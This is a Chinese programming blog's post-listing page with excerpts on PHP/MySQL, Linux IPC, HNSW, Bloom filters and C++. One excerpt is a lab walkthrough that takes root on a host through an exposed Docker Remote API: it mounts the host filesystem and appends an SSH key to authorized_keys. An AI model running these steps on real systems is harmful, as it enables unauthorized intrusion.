<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1bddd526de6fd867d7ab13dbab4f47c1/" rel="bookmark">
			PHP数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PHP MySQL 连接数据库 MySQL 简介MySQL Create 免费的 MySQL 数据库通常是通过 PHP 来使用的。
连接到一个 MySQL 数据库 在您能够访问并处理数据库中的数据之前，您必须创建到达数据库的连接。
在 PHP 中，这个任务通过 mysql_connect() 函数完成。
语法 mysql_connect(servername,username,password); 注释：虽然还存在其他的参数，但上面列出了最重要的参数。请访问 W3School 提供的 PHP MySQL 参考手册，获得更多的细节信息。
例子 在下面的例子中，我们在一个变量中 ($con) 存放了在脚本中供稍后使用的连接。如果连接失败，将执行 "die" 部分：
&lt;?php $con = mysql_connect("localhost","peter","abc123"); if (!$con) { die('Could not connect: ' . mysql_error()); } // some code ?&gt; 关闭连接 脚本一结束，就会关闭连接。如需提前关闭连接，请使用 mysql_close() 函数。
&lt;?php $con = mysql_connect("localhost","peter","abc123"); if (!$con) { die('Could not connect: ' . mysql_error()); } // some code mysql_close($con); ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1bddd526de6fd867d7ab13dbab4f47c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3182360d907db84d701f63b914795661/" rel="bookmark">
			linux下C语言实现进程通信与共享内存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是练习时长两年半的练习生，喜欢唱、跳、rap、敲代码，键来！
在前面我们已经讲过，早期的进程间通信有三种——无名管道、有名管道、信号，（传送门：Linux C 进程间的通信——无名管道、有名管道、信号），今天就来浅谈一下在system V IPC的三种对象，也是进程通信的另外三种姿势——共享内存、消息队列、信号量。
目录
一、共享内存
（一）概念
（二）基操
（三）相关API （四）示例代码
二、消息队列
（一）消息队列通信原理
（二）基操
（三）相关API
（四）示例代码
三、信号量
（一）概念
（二）基操
（三）相关API
（四）代码实例
四、总结
补充：shell查看和删除IPC对象
一、共享内存
（一）概念
共享内存是一种最为高效的进程间通信方式，进程可以直接读写内存，而不需要任何数据的拷贝。为了在多个进程间交换信息，内核专门留出了一块内存区，可以由需要访问的进程将其映射到自己的私有地址空间，进程就可以直接读写这一内存区而不需要进行数据的拷贝，从而大大提高进程通信的效率。
（二）基操
1》创建或者获取共享内存
2》将共享内存映射到用户空间 3》解除映射
4》删除共享内存 （三）相关API 1. 创建密钥 ftok
注意！！！
只要pathname和proj_id不变，就可以获得相同的key，如下，进程A和进程B获得的key相同。
例子：
进程A：key_t key1=ftok("xx.txt",0xa);
进程B：key_t key2=ftok("xx.txt",0xa);
#include &lt;sys/types.h&gt;
#include &lt;sys/ipc.h&gt;
/**
***********************************
*@brief 创建密钥key
*@param pathname：带路径的文件名
proj_id：数字
*@retval key_t
成功返回key
失败返回-1，并返回错误码EOF
***********************************
*/
key_t ftok(const char *pathname, int proj_id);
2. 创建共享内存 shmget
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3182360d907db84d701f63b914795661/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c529da08c5e04e9c147b929aba82013/" rel="bookmark">
			Docker Remote API未授权访问漏洞以及安全防护
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、拓扑图 二、环境与配置 环境 设备
IP地址
操作类型
docker版本
镜像
训练机
192.168.0.2
centos7
18.03.1-ce
*
靶机
192.168.0.3
Ubuntu
24.0.4
至少一个容器镜像
靶机配置 执行vi /usr/lib/systemd/system/docker.service命令对靶机docker服务进行配置
执行 ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://192.168.0.3:2375命令编辑docker.service文件，开启 Docker daemon 的远程访问，也就允许Docker daemon 进行本地和远程通信
三、背景 在使用Docker Swarm中，管理Docker的节点默认会启动一个API服务，并且将2375作为默认端口，0.0.0.0绑定为默认可以访问到API的IP。因为API是可以执行Docker命令的，所以暴露在公网上就非常危险。如果目标是以root权限运行的Docker，那么就可以利用Docker能挂载宿主机的物理路径到容器中来写入ssh公钥来获取shell。
四、API测试 4.1执行docker -H tcp://192.168.0.3:2375 version命令查看靶机docker版本
4.2执行docker -H tcp://192.168.0.3:2375 images命令查看靶机docker下容器镜像
五、漏洞利用 5.1执行docker -H tcp://192.168.0.3:2375 run -it -v /:/mnt ubuntu /bin/bash命令将靶机的/路径挂载到容器的/mnt路径下
5.2新建一个训练机的终端，执行ssh-keygen -t rsa命令生成秘钥对
5.3执行cat /root/.ssh/id_rsa.pub查看公钥内容
5.4将公钥内容复制到文本编辑器中，然后将换行符删掉，将内容变成一行
然后切换到训练机进入容器Ubuntu的终端，在容器中输入echo "删除换行符后的内容" &gt;&gt;/mnt/root/.ssh/authorized_keys，命令如下:
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFPFe9B7fHccehER3gLBPWr6xEM771AH2IO8P6DYK4u/RCes/E6o4Q7jAt+nLCrN8t3jJrCM6A626mr0h TuKYVGO6kxWs9lCJC8TlGv2B69fJVx7vX/HrwaBHQkPoyMq3GM7BoiFGiSJUu29qaTv/zZmxn7252yflQXeXoIqxQVWgX8OQDKlXQk6F+mvvLJNZSUUVMb4FOjfViChAJ8JBOaUbK5xQbpsDjiCQX Ike7X0pHHSb5PcOLs0ZuY059NqCrboiwCglrYsevlTWLEe4FNNfyjDxsAIxW40SU7p1hl/Hd42TQdDPpw9wfmYzxMq8cwG/hadzR6dSea5bKRetB root@Server-e76b1696-2869-4f19-97dd- b5c56e217cc9.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2c529da08c5e04e9c147b929aba82013/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a566cae227221ca3f78015cee47b3a04/" rel="bookmark">
			MacOS解决zsh: command not found: vue
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		sudo su
进入超级管理员模式
输入密码
重装vue
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bde7dd841920527e6986e8b992a72878/" rel="bookmark">
			Hierarchical Navigable Small World (HNSW)算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hierarchical Navigable Small World (HNSW)算法 HNSW的主要idea是构建一个图，使得两个点之间只需要很短的几跳究竟能到达（这也是大部分graph-based算法所关注到的）
根据现实世界的六度握手原理：世界上所有的人都能够在六次联系内联系到另一个人
在介绍HNSW的工作流程前，先介绍一下跳表（skip lists）和可导航小世界（navigable small world）。
Skip lists： 这是一个概率数据结构，可在排序列表中插入和搜索元素，平均耗时为 O ( l o g n ) O(logn) O(logn)。跳表由多层列表组成，最底层是原始列表（所有元素），层数越高，被跳过的元素越多，连接数越少。
对某个值的搜索过程从最高层开始，并将下一个元素与该值进行比较。如果该值小于或等于该元素，则算法进入下一个元素。否则，搜索程序会下降到连接更多的下一层，并重复相同的过程。最后，算法下降到最底层，找到所需的节点。
Navigable Small World： 是一个搜索复杂度为多对数$ T = O(logᵏn)$的图，它使用贪婪路由。路由指的是搜索过程从低度顶点开始，到高度顶点结束。由于低度顶点的连接很少，算法可以在它们之间快速移动，有效地导航到最近的邻居可能所在的区域。然后，算法逐渐切换到高度顶点，在该区域的顶点中寻找最近的邻居。
downhill寻找过程，但是遇到early stopping的问题。
NSW图构建：每个新点都向其K近邻连边，那么早连的边就会成为long range link。
1 HNSW算法 HSNW基于与跳表和可导航小世界相同的原理。它的结构是一个多层图，顶层的连接较少，底层的区域较密集。
1.1 Search 搜索从最高层开始，每当在各层节点中贪心找到当前最近邻居时，就向下搜索一层。最终，在最底层找到的近邻就是查询的答案。
与 NSW 类似，HNSW 也可以通过使用多个入口点来提高搜索质量。与在每一层只寻找一个近邻不同，我们会寻找与查询向量最近的 efSearch（一个超参数）近邻，并将这些近邻中的每一个作为下一层的切入点。
1.2 Construction Choosing the maximum layer: HNSW 中的节点一个接一个地按顺序插入。每个节点都被随机分配一个整数 l，表示该节点在图中能出现的最大层数。例如，如果 l = 1，则只能在 0 层和 1 层找到该节点。 为每个节点随机选择 l，其概率分布呈指数衰减，并由非零乘数 M l M_l Ml​归一化（ M l M_l Ml​ = 0 会导致 HNSW 中只有一层，搜索复杂度无法优化）。通常情况下，大多数 l 值应等于 0，因此大多数节点只出现在最底层。 M l M_l Ml​值越大，节点出现在较高层的概率就越大。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bde7dd841920527e6986e8b992a72878/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1eea5af80b7d865f3809a11d0b661ee3/" rel="bookmark">
			Springboot集成海康威视门禁设备，车牌识别摄像头，人脸设备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		海康设备集成springboot 提示：写完文章后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 海康设备集成springboot前言一、海康SDK包根据下载的SKD包中的DEMO示例连接设备创建一个springboot项目将库文件放入根目录lib文件下（lib自己创建）maven 加载一下连接设备海康设备下载网络设备搜索工具能找到设备后将参数写到AcsMain的main方法中 二、车牌识别三、单元门禁DEMO中Alarm进行监听 前言 公司要做一个智慧社区项目，之前是通过海康平台的接口简单好用，只不过现在收费啦，所有要换成SDK的方式来获取数据，现在来总结一下经验
提示：以下是本篇文章正文内容，下面案例可供参考
一、海康SDK包 海康SDK包下载
根据下载的SKD包中的DEMO示例连接设备 创建一个springboot项目将库文件放入根目录lib文件下（lib自己创建）maven 加载一下 连接设备 1.HCNetSDK.dll这个文件根据自己的来
代码如下（示例）：
/** * 根据不同操作系统选择不同的库文件和库路径 * @return */ private static boolean createSDKInstance() { if(hCNetSDK == null) { synchronized (HCNetSDK.class) { String strDllPath = ""; try { //System.setProperty("jna.debug_load", "true");modules if(osSelect.isWindows()) //win系统加载库路径 strDllPath = System.getProperty("user.dir") + "\\modules\\trafficrecord\\lib\\HCNetSDK.dll"; else if(osSelect.isLinux()) //Linux系统加载库路径 //获取到的path是file:/home/trafficrecord-1.0-SNAPSHOT.jar!/BOOT-INF/classes!/lib/linux/libhcnetsdk.so格式的 //strDllPath = AcsMain.class.getClassLoader().getResource("/lib/linux/libhcnetsdk.so").getPath().substring(5); strDllPath = "/usr/lib64/libhcnetsdk.so"; System.out.println("==============================================="); System.out.println("strDllPath==="+strDllPath); hCNetSDK = (HCNetSDK) Native.loadLibrary(strDllPath, HCNetSDK.class); }catch (Exception ex) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1eea5af80b7d865f3809a11d0b661ee3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01a56a501765ca2fdddff29b0b0788c9/" rel="bookmark">
			布隆过滤器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		5.12 布隆过滤器 5.12.1 概述 **布隆过滤器（Bloom Filter）**是一种空间高效的数据结构，用于判断一个元素是否在集合中。它由布隆在1970年提出，因此得名。
布隆过滤器的基本思想是，利用多个不同的哈希函数将一个元素映射到多个不同的位（或桶）上，并将这些位设置为1。当查询一个元素是否在布隆过滤器中时，将这个元素进行哈希操作，得到多个哈希值，并检查这些哈希值对应的位是否都为1。如果有任意一个位为0，则可以确定该元素不在布隆过滤器中；如果所有位都为1，则不能确定该元素一定在布隆过滤器中，因为可能存在哈希冲突，即不同的元素被映射到了相同的位上。
可以简单地将布隆过滤器理解为Set集合（其实他们之间差别还是很大的），可以向里边存放元素，然后判断元素是否存在。
布隆过滤器的优点：
时间复杂度低，增加和查询元素的时间复杂为O(N)，（N为哈希函数的个数，通常情况比较小）保密性强，布隆过滤器不存储元素本身存储空间小，如果允许存在一定的误判，布隆过滤器是非常节省空间的（相比其他数据结构如Set集合）（存在一种叠加） 布隆过滤器的缺点：
有一定的误判率，但是可以通过调整参数来降低
无法获取元素本身，只能判断是否存在
很难删除元素
适用场景
解决Redis缓存穿透问题网络爬虫的网址去重数据库中的数据查询优化内容推荐，推荐过的不重复推荐 5.12.2 布隆过滤器的原理 如上图，同一个数据经过三个不同的哈希函数获得不同的存储位置，然后将对应索引里的值改为1，只有三个索引对应的值都为1才能说明值已存在，有其中一个不为1都不行。可以试想，当哈市算法为1时，一个数据只对应一个索引，只要那个索引值为1就说明存在，由于哈希冲突的存在，出现误判的可能性是较大的，随着哈希函数数量增多，所需要的储存空间也越多，一个数值需要判断的索引也越多，自然出现误判的几率就小了。（存储01的为二进制数组）
当有多个数值存储时，就是下图的叠加情况
所以这也是为什么很难删除的原因，因为多个数值可能会用到同一索引，一旦删除其中一个就会导致严重误删。
小结：
哈希函数越多，所需存储空间越大，计算时间越长，误判率越低 空间计算
布隆过滤器提供两个参数，一个是预计存储元素个数n，一个是误判率。在添加元素之前，布隆过滤器有着初始的存储空间，也就是二进制数组的长度。当添加元素时，布隆过滤器会根据我们填入的这两个参数计算出二进制数组的大小以及hash函数的个数，既要满足我们的要求，又要使空间和计算量的开销都减到最小。
布隆过滤器在线计算的网址：https://krisives.github.io/bloom-calculator/
5.12.3 Redis集成布隆过滤器 这里先介绍使用Docker安装的，所以前置条件是你装了Docker
Redis的安装这里就不再赘述了，没有安装的去安装
下载RedisBloom镜像
docker pull redislabs/rebloom 启动RedisBloom容器：使用以下命令启动RedisBloom容器：
docker run -d --name redisbloom --link redis:redis redislabs/rebloom 这将在后台启动一个名为“redisbloom”的容器，并将它链接到名为“redis”的容器。
连接到RedisBloom容器：使用以下命令连接到RedisBloom容器：
docker exec -it redisbloom sh 这将进入RedisBloom容器的命令行界面。
加载RedisBloom模块：在RedisBloom容器中，使用以下命令加载RedisBloom模块：
redis-cli module load /usr/lib/redis/modules/rebloom.so 这将加载RedisBloom模块并准备好在Redis中使用。
安装完之后就可以在Redis中使用RedisBloom模块中提供的命令来创建布隆过滤器并执行其他操作。需要注意的是，Redis和RedisBloon的数据都是在内存运行的，所以一旦如果停止了Redis容器或RedisBloom容器，所有数据将被清除。如果需要保存数据就得做持久化操作。（具体怎么操作看Docker一章）
RedisBloom模块常见指令
BF.RESERVE: 创建一个新的布隆过滤器。
BF.ADD: 将元素添加到布隆过滤器中。
BF.MADD: 将多个元素添加到布隆过滤器中。
BF.EXISTS: 检查元素是否存在于布隆过滤器中。
BF.MEXISTS: 检查多个元素是否都存在于布隆过滤器中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01a56a501765ca2fdddff29b0b0788c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58fb366db453f6091dca7274c695c74c/" rel="bookmark">
			基于JSP的网上购物系统的设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘：本篇论文详细介绍了一款基于JSP的网上购物系统的设计与实现。系统设计包括前端设计、后端设计和数据库设计，实现了用户登录、商品展示、购物车管理和订单管理等功能。系统实现包括前端页面开发、后端业务逻辑编写和数据库操作。通过实验验证，该系统具有良好的功能和性能，能够满足用户的网上购物需求。
关键词：网上购物系统、JSP、前端设计、后端设计、数据库设计
1. 引言
网上购物已成为现代生活的重要组成部分之一，而网上购物系统可以提供便捷的购物体验。本篇论文设计并实现了一款基于JSP的网上购物系统。该系统通过前端设计、后端设计和数据库设计，实现了用户的登录、商品的展示、购物车管理和订单管理等功能。
2. 系统设计
2.1 前端设计
前端设计包括用户登录界面、商品展示界面、购物车界面和订单管理界面等。用户登录界面用于用户身份认证，商品展示界面展示商品信息并提供购买功能，购物车界面显示用户已选择的商品并提供结算功能，订单管理界面用于显示用户的订单信息。
2.2 后端设计
后端设计包括用户身份验证、商品信息管理、购物车管理和订单管理等功能。用户身份验证用于验证用户的登录信息，商品信息管理包括商品的添加、删除和修改等操作，购物车管理包括商品的添加、删除和数量调整等操作，订单管理包括订单的生成和支付等操作。同时，后端还需要处理数据库连接和查询等操作。
2.3 数据库设计
数据库设计包括用户信息表、商品信息表、购物车表和订单表等。用户信息表存储用户的登录信息，商品信息表存储商品的相关信息，购物车表存储用户添加到购物车中的商品信息，订单表存储用户的订单信息。
3. 系统实现
3.1 前端页面开发
前端页面开发使用HTML、CSS和JavaScript等前端技术，实现页面布局、界面交互和数据展示等功能。同时，使用JSP技术将后端数据动态地插入到页面中。
3.2 后端业务逻辑编写
后端业务逻辑编写使用Java语言和JSP技术，实现用户身份验证、商品信息管理、购物车管理和订单管理等功能。通过Servlet或JSP脚本处理用户请求，调用相应的业务逻辑代码，实现数据的处理和返回。
3.3 数据库操作
数据库操作使用JDBC技术，实现与数据库的交互，包括数据的读取、更新和插入等操作。使用JDBC连接数据库，执行SQL语句并处理结果，实现对数据库的操作。
附录代码：
以下是网上购物系统的部分代码示例：
商品展示页面（product.jsp）：
```jsp
&lt;%@ page language="java" contentType="text/html; charset=UTF-8"
pageEncoding="UTF-8" %&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset="UTF-8"&gt;
&lt;title&gt;网上购物&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h2&gt;商品展示&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;商品1&lt;/li&gt;
&lt;li&gt;商品2&lt;/li&gt;
&lt;li&gt;商品3&lt;/li&gt;
...
&lt;/ul&gt;
&lt;a href="cart.jsp"&gt;查看购物车&lt;/a&gt;
&lt;/body&gt;
&lt;/html&gt;
```
后端业务逻辑（AddToCartServlet.java）：
```java
import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58fb366db453f6091dca7274c695c74c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d8128ee8037cb32ae133b9f22fb3f46/" rel="bookmark">
			【C&#43;&#43;】STL——list的介绍和使用、list增删查改函数的介绍和使用、push_back、pop_back
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.list的使用2.list的增删查改函数（1）push_front 在list首元素前插入值为val的元素（2）pop_front 删除list中第一个元素（3）push_back 在list尾部插入值为val的元素（4）pop_back 删除list中最后一个元素（5）insert 在list position 位置中插入值为val的元素（6）erase 删除list position位置的元素（7）swap 交换两个list中的元素（8）clear 清空list中的有效元素 1.list的使用 list构造函数的介绍和使用
2.list的增删查改函数 （1）push_front 在list首元素前插入值为val的元素 push_front()函数用于将一个新的元素插入到链表的开头位置。 通过调用push_front()函数并将待插入的元素作为参数传递给该函数，即可实现在链表开头插入新元素的操作。
和链表的插入一样，push_front()函数的时间复杂度为O(1)，因为在双向链表中插入元素到开头位置的操作只涉及到指针的重新链接，而不需要移动其他元素。
以下是关于push_front()函数的定义和使用示例：
#include &lt;iostream&gt; #include &lt;list&gt; int main() { std::list&lt;int&gt; myList = {2, 3, 4}; // 使用 push_front() 在链表开头插入元素 myList.push_front(1); // 输出链表中的元素 for (const auto&amp; element : myList) { std::cout &lt;&lt; element &lt;&lt; " "; } std::cout &lt;&lt; std::endl; return 0; } //1 2 3 4 （2）pop_front 删除list中第一个元素 pop_front()函数用于删除链表的第一个元素。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d8128ee8037cb32ae133b9f22fb3f46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d70db41d59eefdbb7ee8a472684921d8/" rel="bookmark">
			【独家源码】ssm互联网在线笔记管理系统6zt42应对计算机毕业设计困难的解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本项目包含程序+源码+数据库+LW+调试部署环境，文末可获取一份本项目的java源码和数据库参考。
系统的选题背景和意义 互联网在线笔记管理系统是一种基于互联网技术的应用平台，旨在提供便捷、安全、高效的笔记管理服务，满足用户对于笔记整理和存储的需求。这一选题具有重要的背景和意义。
随着信息时代的到来，人们面临着大量的信息和知识需要整理和管理。传统的纸质笔记本已经无法满足人们对于笔记的存储、检索和分享的需求。而互联网在线笔记管理系统的出现填补了这一空白。
首先，互联网在线笔记管理系统可以提供便捷高效的笔记整理和存储服务。通过平台的在线编辑功能，用户可以随时随地创建、编辑和保存自己的笔记。无论是文字、图片还是音频、视频等多种形式的内容，都可以方便地进行记录和管理。用户不再需要担心纸质笔记本的丢失或翻找困难的问题，大大提高了工作和学习的效率。
其次，互联网在线笔记管理系统可以实现笔记的多端同步和备份。用户可以在不同的设备上登录平台账号，实现笔记的实时同步和共享。无论是在电脑、手机还是平板上进行的笔记编辑，都可以在其他设备上实时查看和修改。同时，系统还会自动进行数据备份，避免因设备损坏或丢失而导致笔记的丢失。
此外，互联网在线笔记管理系统对于笔记的分类和检索也具有重要意义。通过平台提供的标签、文件夹等分类功能，用户可以将笔记按照不同的主题或项目进行整理和归档。同时，系统还支持关键词搜索和全文检索，用户可以快速找到需要的笔记内容，提高了信息的查找效率。
最后，互联网在线笔记管理系统对于知识分享和协作也具有重要意义。用户可以将自己的笔记设置为公开或分享给特定的人群，实现知识的共享和传播。同时，系统还支持多人协作编辑，多个用户可以同时对同一份笔记进行编辑和评论，促进团队合作和学习交流。
综上所述，建立互联网在线笔记管理系统具有重要的背景和意义。它可以提供便捷高效的笔记整理和存储服务，实现笔记的多端同步和备份，支持笔记的分类和检索，促进知识的分享和协作。这将为用户提供一个方便、安全、高效的笔记管理平台，提升工作和学习的效率，推动个人和组织的发展和进步。
以上选题背景和意义内容是根据本选题撰写，非本作品实际的选题背景、意义或功能。各位童鞋可参考用于写开题选题和意义内容切勿直接引用。本作品的实际功能和技术以下列内容为准。
技术栈： 本项目的技术栈主要包括前端Vue、后端Java程序语言开发、SSM框架和MySQL5.7数据库。
Vue是一种轻量级的JavaScript框架，能够快速构建交互式的用户界面。Vue提供了易于使用的API，使得开发者可以非常容易地创建组件化、可复用的代码。
Java是一种跨平台的编程语言，拥有丰富的库和工具生态系统，广泛用于企业级应用开发。Java在后端服务开发方面拥有强大的性能和可伸缩性，并且能够很好地与其他技术栈集成，如Spring、Hibernate、MyBatis等。
SSM框架是Spring、SpringMVC和MyBatis三个框架的结合体，其整合了各自优势，形成了完整的Web开发框架。本系统客户端向服务器发送请求，SpringMVC拦截请求交给相应的控制器（Controller）处理，使用注解或配置文件定义URL和方法映射，控制器调用Service层中的业务逻辑处理方法，Service层处理完毕后将结果返回给控制器，控制器根据返回的结果选择适当的视图（View）进行展示，视图渲染完成后返回给客户端的过程。
MySQL5.7是一种开源的关系型数据库管理系统，在数据存储和管理方面表现优异。它能够轻松地集成到任何技术栈中，如Java、Python、Ruby等。除此之外，MySQL还具备高可靠性、高稳定性、易扩展性和强数据安全性等特点。
我们选择Vue、Java、SSM框架和MySQL5.7作为本作品的技术栈，具有语言间的无缝协作、代码复用性强、开发效率高、性能高等诸多优势。
互联网在线笔记管理系统功能模块的结构图，如图4-1所示：
图4-1互联网在线笔记管理系统结构图
4.2数据库设计 在整个系统来说，数据库的设计是相当重要的，需要非常仔细去设计。
本系统中涉及的各级权限分别是：
（1）用户登录权限，可以查看笔记本信息、笔记信息、新闻资讯等信息，修改查看自己的信息。
（2）管理员权限，管理员有系统的所有权限，包括用户的管理，可以添加、修改和删除任意权限的用户；还包括发布网站的笔记本信息、笔记信息、笔记本分类等等。
4.2.1概念结构设计 根据分析系统的数据需求，得到系统的实体属性图。
(1)回收站信息E-R图，如图4-2所示：
图4-2回收站信息E-R图
(2)笔记本信息E-R图，如图4-3所示：
图4-3笔记本信息E-R图
(3)用户信息E-R图，如图4-4所示：
图4-4用户信息E-R图
(4)笔记信息E-R图，如图4-5所示：
图4-5笔记信息E-R图
用户功能模块 用户登录进入互联网在线笔记管理系统可以查看首页、个人中心、笔记本信息管理、笔记信息管理、回收站管理等内容，如图5-1所示。
图5-1用户功能界面图
个人中心：用户通过自己的个人中心，可进行密码修改，也可对个人信息进行编辑账号、姓名、性别、手机、地址、头像等内容，进行修改操作，如图5-2所示。
图5-2个人中心界面图
笔记本信息管理：用户通过笔记本信息管理页面可以查看笔记本名称、笔记本分类、创建时间、笔记本封面、账号等内容，进行详情、修改、删除等操作，如图5-3所示。
图5-3笔记本信息管理界面图
笔记信息管理：用户通过笔记信息管理页面查看笔记本名称、笔记本分类、笔记名称、发布时间、笔记图片、账号等内容，进行修改、删除等操作，如图5-4所示。
图5-4笔记信息管理界面图
回收站管理：用户通过回收站管理页面查看笔记名称、笔记类型、删除时间、账号等内容，进行修改、删除等操作，如图5-5所示。
图5-5回收站管理界面图
5.2管理员功能模块 运行系统，首先进入登录界面，按照登录界面的要求填写相应的“用户名”和“密码”以及选择角色，点击“登录”然后系统判断填写是否正确，若正确进入相应的界面，具体流程如图5-6所示。
登录流程图
图5-6管理员登录界面图
管理员登录进入互联网在线笔记管理系统查看首页、个人中心、用户管理、笔记本信息管理、笔记信息管理、笔记本分类管理、回收站管理、系统管理等内容，如图5-7所示。
图5-7管理员功能界面图
管理员对个人中心进行操作填写原密码、新密码、确认密码并进行添加、删除、修改以及查看。修改密码，管理员对修改密码进行操作填写原密码、新密码、确认密码并进行添加、删除、修改以及查看，如图5-8所示。
图5-8修改密码界面图
用户管理，管理员在用户管理页面可以查看账号、姓名、性别、手机、地址、头像等内容，并可根据需要对用户管理进行修改或删除等操作，如图5-9所示。
图5-9用户管理界面图
笔记本信息管理，管理员在笔记本信息管理页面可以查看笔记本名称、笔记本分类、创建时间、笔记本封面、账号等内容，并可根据需要对笔记本信息管理进行修改或删除等操作，如图5-10所示。
图5-10笔记本信息管理界面图
笔记信息管理，管理员在笔记信息管理页面可以查看笔记本名称、笔记本分类、笔记名称、发布时间、笔记图片、账号等内容，并可根据需要对笔记信息管理进行修改或删除等操作，如图5-11所示。
图5-11笔记信息管理界面图
笔记本分类管理，管理员在笔记本分类管理页面查看笔记本分类等内容，并可根据需要对笔记本分类管理进行修改，删除等操作，如图5-12所示。
图5-12笔记本分类管理界面图
回收站管理，管理员在回收站管理页面查看笔记名称、笔记类型、删除时间、账号等内容可进行修改，删除等操作，如图5-13所示。
图5-13回收站管理面图
系统管理，管理员在系统管理页面查看名称、值等内容进行修改、删除等操作，并且还可以发布新闻资讯，如图5-14 5-15所示。
图5-14轮播图管理界面图
图5-15新闻资讯界面图
5.3前台首页功能模块 用户在系统前台首页可以查看首页、笔记本信息、笔记信息、新闻资讯、个人中心、后台管理等内容，如图5-16所示。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d70db41d59eefdbb7ee8a472684921d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c760bb1ed4d84f3808d15fdc58d1635a/" rel="bookmark">
			多线程-synchronized
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 synchronized同步方法synchronized同步静态方法synchronized同步代码块 Java的多线程允许同时做多件事情。但是，两个及两个以上的线 程彼此互相影响的问题也就出现了。如果不防范这种冲突，就可能发 生两个用户购买了同一个座位的火车票，且都购票成功的事情。 synchronized同步方法 参见如下代码，这是一个倒计时器类，创建计时器对象时赋给初
始值。调用timeout()方法就开始倒计时。
synchronized同步静态方法 synchronized同步代码块 方法同步的关键是为了保护共享资源，如果synchronized方法中
没有使用共享资源，就无须使用synchronized同步这个方法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc3e2316a499f2ec82f4fcd3c83e3601/" rel="bookmark">
			ether_crc_le()函数解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		函数作用 ether_crc_le()函数是一个用于计算以太网帧的循环冗余校验（CRC）的函数。
下面是ether_crc_le()函数的源码解析：
